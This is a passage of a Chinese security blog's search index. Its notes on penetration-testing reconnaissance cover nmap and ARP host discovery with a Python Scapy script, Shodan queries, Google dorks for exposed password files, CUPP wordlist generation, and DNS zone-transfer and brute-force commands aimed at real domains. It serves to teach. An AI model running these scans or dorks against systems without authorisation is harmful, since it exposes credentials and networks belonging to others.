191.168.1.1-254 -sn    or    nmap 192.168.1.0/24 -snnmap -iL iplist.txt -sn</code></pre><blockquote><p>Netdiscover</p></blockquote><p>专用于二层发现<br>可用于无线和交换网络环境<br>主动肯被动探测</p><pre><code>主动：    netdiscover -i eth0 -r 1.1.1.0/24    netdiscover -l iplist.txt被动：    netdiscover -p     主动arp容易触发报警</code></pre><blockquote><p>Scapy</p></blockquote><pre><code>作为Python库进行调用也可作为单独工具使用抓包，分析，创建，修改，注入网络流量apt-get install python-gnuplotScapy    ARP().display()    Sr1()</code></pre><blockquote><p>Python脚本:<code>Arp1.py</code> </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">logging.getLogger(<span class="string">"scapy.runtime"</span>).setLevel(logging.ERROR)</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv)!=<span class="number">2</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Usage - ./arp_disc.py [interface]"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Example - ./arp_disc.py eth0"</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"example will perform an ARP scan of the local subnet to which eht0 is assigned"</span></span><br><span class="line">sys.exit()</span><br><span class="line"></span><br><span class="line">interface=str(sys.argv[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">ip=subprocess.check_output(<span class="string">"ifconfig"</span>+interface+<span class="string">" | grep 'inet addr' | cut -d ':' -f 2 | cut -d ' ' -f 1"</span>,shell=<span class="literal">True</span>).strip()</span><br><span class="line">prefix=ip.split(<span class="string">'.'</span>)[<span class="number">0</span>]+ip.split(<span class="string">'.'</span>)[<span class="number">1</span>]+<span class="string">'.'</span>+ip.split(<span class="string">'.'</span>)[<span class="number">2</span>]+<span class="string">'.'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> addr <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">254</span>):</span><br><span class="line">answer=sr1(ARP(pdst=prefix+str(addr)),timeout=<span class="number">0.1</span>,verbose=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">if</span> answer==<span class="literal">None</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> prefix+str(addr)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 主动信息收集 </tag>
            
            <tag> 扫描开发 </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Search Hacking信息收集姿势</title>
      <link href="/2013/03/12/Information_Gethering/Search%20Hacking%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%A7%BF%E5%8A%BF/"/>
      <url>/2013/03/12/Information_Gethering/Search%20Hacking%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>SHODAN</p></blockquote><pre><code>net:8.8.8.8    or net:8.8.8.0/24 country:CN city:beijing port:22os:&quot;windows&quot;server:apachehostname:google.com</code></pre><p>example:<br>200 OK cisco country:JP<br>user:amdin pass:password<br>linux upnp avtech</p><blockquote><p>google hacking</p></blockquote><p><a href="https://www.exploit-db.com/google-hacking-database" target="_blank" rel="noopener">GHDB</a></p><pre><code>title:关键字 indext:关键字 indext:关键字inurl:/../../inurl:/admin/login.phpinurl:qq.txtinurl:ftp &quot;password&quot; filetype:xls inurl:service.pwdfiletype:xls &quot;username | password&quot;intitle:&quot;netbotz appliance&quot; &quot;ok&quot;</code></pre><blockquote><p>theHarvester （并发多引擎搜索）<br>metagoofil    (并发多引擎文件搜索)<br>Maltego</p></blockquote><p>CUPP– common User Password Proliler (根据用户信息生成密码字典)</p><pre><code>get clone https://github.com/Mebus/cupp.get</code></pre><blockquote><p>METADATA图片源信息查看</p></blockquote><p>exiftool x.jpg  #查看图片exif信息<br>foca            #windows查看图片源数据工具</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 被动信息收集 </tag>
            
            <tag> SHODAN </tag>
            
            <tag> GOOGLE HACKING </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>已知域名解析查询</title>
      <link href="/2013/03/11/Information_Gethering/%E5%B7%B2%E7%9F%A5%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2/"/>
      <url>/2013/03/11/Information_Gethering/%E5%B7%B2%E7%9F%A5%E5%9F%9F%E5%90%8D%E6%9F%A5%E8%AF%A2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>nslookup</p></blockquote><pre><code>nslookup sina.com type=any</code></pre><blockquote><p>DIG</p></blockquote><pre><code>dig sina.com any @1.1.1.1dig mail.163.com anydig +trace www.sian.com  #根域追踪  劫持查询</code></pre><blockquote><p>DNS区域传输</p></blockquote><pre><code>dig sina.com nsdig @ns1.example.com example.com axfrhost -T -l sina.com ns2.sina.com</code></pre><blockquote><p>DNS字典爆破</p></blockquote><pre><code>fierce -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist hosts.txtdnsdict6 -d4 -t 16 -x sina.com #字典质量高，速度块dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -a sina.xmldnsmap sina.com -w dns.txtdnsrecon -d sina.com --lifetime 10 -t brt -D dnsbig.txt  #快dnsrecon -t std -d sina.com</code></pre><blockquote><p>查找字典位置</p></blockquote><pre><code>dpkg -L fiercefind / -name dnsenum</code></pre><blockquote><p>DNS注册信息</p></blockquote><pre><code>whois whois -h whois.apnic.net 1.1.1.1</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> 被动信息收集 </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
